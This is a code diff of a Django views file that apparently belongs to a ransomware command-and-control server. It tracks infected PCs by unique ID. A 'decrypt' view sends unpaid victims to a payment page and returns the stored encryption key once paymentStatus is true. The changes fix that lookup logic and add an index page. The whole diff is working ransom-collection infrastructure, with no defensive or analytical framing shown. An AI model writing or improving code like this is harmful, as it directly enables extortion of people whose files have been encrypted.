@@ -34,6 +34,7 @@ class ListInfectedPcView(generics.ListAPIView):
                 data="InfectedPC already existing",
                 status=status.HTTP_200_OK
             )
+
 def decrypt(request):
     # if this is a POST request we need to process the form data
     if request.method == 'POST':
@@ -41,20 +42,22 @@ def decrypt(request):
         form = decryptForm(request.POST)
         # check whether it's valid:
         if form.is_valid():
-            exists = InfectedPc.objects.filter(uniqueId = form.cleaned_data['uniqueId']).exists()
-            paymentStatus = InfectedPc.objects.filter(form.cleaned_data['uniqueId']).get('paymentStatus')
-            if exists == True and paymentStatus == False:
-                return render(request, 'payment.html', {'uniqueId': form.cleaned_data['uniqueId']})
-            if exists == True and paymentStatus == True:
-                return HttpResponse(InfectedPc.objects.filter(uniqueId = form.cleaned_data['uniqueId']).get('encryptionKey'))
+            uniqueId = form.cleaned_data['uniqueId']
+            infectedPcObject = InfectedPc.objects.filter(uniqueId=uniqueId).last()
+            exists = InfectedPc.objects.filter(uniqueId=uniqueId).exists()
+            if exists == True:
+                paymentStatus = infectedPcObject.paymentStatus
+                if paymentStatus == False:
+                    return render(request, 'payment.html', {'uniqueId': uniqueId})
+                if paymentStatus == True:
+                    return HttpResponse("already paid! Decryption key is: " + infectedPcObject.encryptionKey)
             else:
-                return HttpResponse("uniqueId does not exist")
-                #
-
-    # if a GET (or any other method) we'll create a blank form
+                return HttpResponse("uniqueId does not exist in this database")
     else:
         form = decryptForm()
 
     return render(request, 'decrypt.html', {'form': form})
+def index(request):
+    return render(request, 'index.html')
     
 
